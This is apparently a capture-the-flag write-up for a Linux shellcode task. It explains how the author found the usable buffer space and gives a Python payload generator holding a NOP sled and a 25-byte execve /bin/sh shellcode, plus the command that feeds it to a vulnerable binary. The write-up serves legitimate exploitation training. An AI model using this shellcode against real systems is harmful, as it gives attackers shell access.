[www.pwnerrank.com/tasks/linux-shellcode-spawn-a-shell][1]

<h2>Process</h2>
After struggling for a bit using the standard "A"*[size] to determine the size I decided why not just fill the entire buffer with `\xcc` and see how little I needed to get it to stop, effectively telling me where I gain control of $EIP.  

Only one `\xcc` was required! Based on my analysis of the stack by overrunning it with `A` and `\xcc` I had 43 chars of room to play with before things would get cut off.

The shell code was 25 bytes which left me with another 18 maximum for NOPs.  I started with a small amount, 5 NOPs followed by my shell code! This works!!  I tried again without any NOPs and it worked as it should.  My mind just instantly thought to throw in a few NOPs for protection.

<h3>Solution </h3>
Python script to generate payload:

```
#buf="\xcc"*1
nop="\x90"*5
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
print nop+shellcode #buf+nop+shellcode
```

Command to run:

```
(python /tmp/gen ; cat) | ./pwnme

```


  [1]: www.pwnerrank.com/tasks/linux-shellcode-spawn-a-shell
